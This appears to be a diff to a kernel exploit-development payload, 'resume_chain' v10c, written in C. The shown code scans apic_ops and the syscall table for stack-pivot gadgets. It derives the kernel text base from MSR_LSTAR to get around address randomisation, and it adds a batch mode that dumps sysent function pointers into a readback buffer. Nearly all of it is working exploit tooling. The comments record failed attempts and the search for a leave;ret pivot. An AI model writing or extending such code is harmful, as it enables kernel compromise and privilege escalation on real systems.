@@ -1,7 +1,7 @@
 #include <stdint.h>
 
 /*
- * resume_chain v10b — apic_ops + sysent gadget scanner
+ * resume_chain v10c — apic_ops + sysent gadget scanner + fn ptr batch dump
  *
  * INT3 (CC) during LAPIC resume is BROKEN (v3, v9a both failed).
  * Alternative: find a leave;ret (C9 C3) gadget for stack pivot.
@@ -26,7 +26,11 @@
  *     0xBB00 + idx → sysent[256+idx] fn-2
  *     0xBC00 + idx → sysent[512+idx] fn-2
  *
- * Output layout (64 uint64_t slots):
+ *   sysent fn ptr dump mode (NEW in v10c):
+ *     0x9900 + batch → dump sysent fn ptrs (batch 0: entries 0-283,
+ *                       batch 1: entries 284-567, batch 2: entries 568-677)
+ *
+ * Output layout for probe modes (64 uint64_t slots):
  *   out[0]     = MAGIC (lo32) + status (hi32)
  *   out[1]     = kdata_base
  *   out[2]     = ktext_base
@@ -41,6 +45,13 @@
  *   out[38]    = probe offset (1=fn-1, 2=fn-2, 3=fn-3)
  *   out[39]    = source (0=apic_ops, 1=sysent)
  *   out[63]    = end marker
+ *
+ * Output layout for dump mode (288 uint64_t slots, 2304 bytes):
+ *   out[0]     = MAGIC (lo32) + status (hi32)
+ *   out[1]     = kdata_base
+ *   out[2]     = ktext_base
+ *   out[3]     = batch | (start_idx << 16) | (count << 32)
+ *   out[4..4+count-1] = fn ptrs for sysent[start_idx..start_idx+count-1]
  *
  * Magic written EARLY so kldload can read partial output on crash.
  */
@@ -63,6 +74,10 @@
 #define PCB_ONFAULT      0x108
 
 #define SENTINEL         0xBAD0BAD0BAD0BAD0ULL
+
+/* Dump mode: 284 fn ptrs per batch (slots 4..287 of 288-slot readback) */
+#define DUMP_BATCH_SIZE  284
+#define READBACK_SLOTS   288
 
 typedef struct {
     uint64_t kdata_base;
@@ -185,6 +200,51 @@ int module_start(kproc_args *args)
         probe_offset = 2;  /* sysent fn-2 */
         use_sysent = 1;
         sysent_page = mode_prefix - 0xBA;
+    } else if (mode_prefix == 0x99) {
+        /*
+         * DUMP MODE: Batch dump sysent fn ptrs (pure kdata reads, no execution)
+         * target_idx = batch number (0, 1, or 2)
+         * Batch 0: entries 0-283, Batch 1: entries 284-567, Batch 2: entries 568-677
+         */
+        int batch = target_idx;
+        int start_idx = batch * DUMP_BATCH_SIZE;
+        int count = DUMP_BATCH_SIZE;
+
+        if (start_idx >= NUM_SYSCALLS) {
+            for (int i = 0; i < READBACK_SLOTS; i++) out[i] = 0;
+            out[1] = kdata_base;
+            out[3] = batch;
+            out32[1] = 0x00FE;
+            __asm__ volatile("mfence" ::: "memory");
+            out32[0] = MAGIC_RSCN;
+            return 0;
+        }
+
+        if (start_idx + count > NUM_SYSCALLS)
+            count = NUM_SYSCALLS - start_idx;
+
+        /* Clear full readback area */
+        for (int i = 0; i < READBACK_SLOTS; i++) out[i] = 0;
+
+        uint64_t lstar = rdmsr(MSR_LSTAR);
+        uint64_t ktext_base = lstar - LSTAR_OFFSET;
+        uint64_t sysent_base = kdata_base + OFF_SYSENT;
+
+        out[1] = kdata_base;
+        out[2] = ktext_base;
+        out[3] = (uint64_t)batch | ((uint64_t)start_idx << 16) | ((uint64_t)count << 32);
+
+        /* Dump fn ptrs */
+        for (int i = 0; i < count; i++) {
+            uint64_t fn = read8(sysent_base + (uint64_t)(start_idx + i) * SYSENT_STRIDE + SYSENT_FUNC_OFF);
+            out[4 + i] = fn;
+        }
+
+        /* Write magic LAST with mfence (all data committed before magic) */
+        out32[1] = 0x110C;  /* v10c dump complete */
+        __asm__ volatile("mfence" ::: "memory");
+        out32[0] = MAGIC_RSCN;
+        return 0;
     } else {
         /* Unknown mode */
         for (int i = 0; i < 64; i++) out[i] = 0;
